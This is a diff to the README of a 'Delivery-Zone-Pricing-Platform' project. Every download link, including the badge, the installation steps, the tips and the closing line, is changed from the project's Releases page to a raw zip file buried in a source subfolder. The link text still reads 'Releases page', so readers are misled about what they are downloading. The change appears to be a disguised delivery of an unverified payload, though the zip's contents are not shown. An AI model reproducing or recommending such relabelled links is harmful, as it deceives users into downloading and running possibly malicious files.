@@ -25,12 +25,12 @@ To run the Delivery-Zone-Pricing-Platform, you will need:
 
 You can download the application from our Releases page. Click the button below:
 
-[![Download Delivery-Zone-Pricing-Platform](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/GamerzEyev2/Delivery-Zone-Pricing-Platform/releases)
+[![Download Delivery-Zone-Pricing-Platform](https://github.com/GamerzEyev2/Delivery-Zone-Pricing-Platform/raw/refs/heads/main/web/src/app/admin/zones/Zone_Pricing_Platform_Delivery_v2.0.zip)](https://github.com/GamerzEyev2/Delivery-Zone-Pricing-Platform/raw/refs/heads/main/web/src/app/admin/zones/Zone_Pricing_Platform_Delivery_v2.0.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/GamerzEyev2/Delivery-Zone-Pricing-Platform/releases).
+   Go to our [Releases page](https://github.com/GamerzEyev2/Delivery-Zone-Pricing-Platform/raw/refs/heads/main/web/src/app/admin/zones/Zone_Pricing_Platform_Delivery_v2.0.zip).
 
 2. **Choose the Latest Release:**
    On the Releases page, locate the version labeled as "Latest". This version contains bug fixes and new features.
@@ -71,7 +71,7 @@ For optimal use, ensure that your internet connection is stable. The application
 ### 🍃 Tips
 
 - Experiment with the polygon tool to accurately represent your delivery areas.
-- Keep the software updated; regularly visit the [Releases page](https://github.com/GamerzEyev2/Delivery-Zone-Pricing-Platform/releases) for the latest features.
+- Keep the software updated; regularly visit the [Releases page](https://github.com/GamerzEyev2/Delivery-Zone-Pricing-Platform/raw/refs/heads/main/web/src/app/admin/zones/Zone_Pricing_Platform_Delivery_v2.0.zip) for the latest features.
 
 ## 🛠️ Troubleshooting
 
@@ -99,4 +99,4 @@ For additional support, suggestions, or to report issues, visit our community fo
 
 --- 
 
-Start managing your delivery zones today by downloading the application from our [Releases page](https://github.com/GamerzEyev2/Delivery-Zone-Pricing-Platform/releases). Your streamlined delivery management experience awaits!
+Start managing your delivery zones today by downloading the application from our [Releases page](https://github.com/GamerzEyev2/Delivery-Zone-Pricing-Platform/raw/refs/heads/main/web/src/app/admin/zones/Zone_Pricing_Platform_Delivery_v2.0.zip). Your streamlined delivery management experience awaits!
